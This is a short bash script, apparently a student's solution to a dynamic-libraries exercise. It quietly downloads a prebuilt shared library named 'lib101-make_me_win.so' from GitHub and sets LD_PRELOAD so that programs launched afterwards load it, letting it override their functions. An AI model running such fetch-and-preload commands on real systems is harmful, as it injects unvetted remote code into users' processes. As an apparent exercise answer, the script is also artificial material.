#!/bin/bash
wget -q --output-document=$HOME/lib101-make_me_win.so https://github.com/DYung26/alx-low_level_programming/raw/master/0x18-dynamic_libraries/lib101-make_me_win.so
export LD_PRELOAD=$HOME/lib101-make_me_win.so
